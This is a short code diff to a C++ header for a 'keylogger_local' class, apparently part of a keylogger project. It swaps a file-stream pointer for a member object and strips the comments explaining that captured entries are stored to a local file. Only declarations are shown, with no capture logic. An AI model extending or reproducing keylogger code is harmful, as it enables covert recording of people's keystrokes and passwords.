@@ -6,26 +6,13 @@
 class keylogger_local : virtual public keylogger
 {
 	private:
-		ofstream* a_ofstream;
+		ofstream m_ofstream;
 
 	public:
-		/*
-		* Constructor with parameters
-		*
-		* Open attribute a_ofstream with parameter p_destination_path
-		*
-		* p_destination_path : Destination to store entry
-		*/
 		keylogger_local(string p_destination_path);
 
-		/*
-		* Destructor
-		*/
 		virtual ~keylogger_local();
 
-		/*
-		* Store data by sending them to a_ofstream
-		*/
 		virtual void store();
 };
 
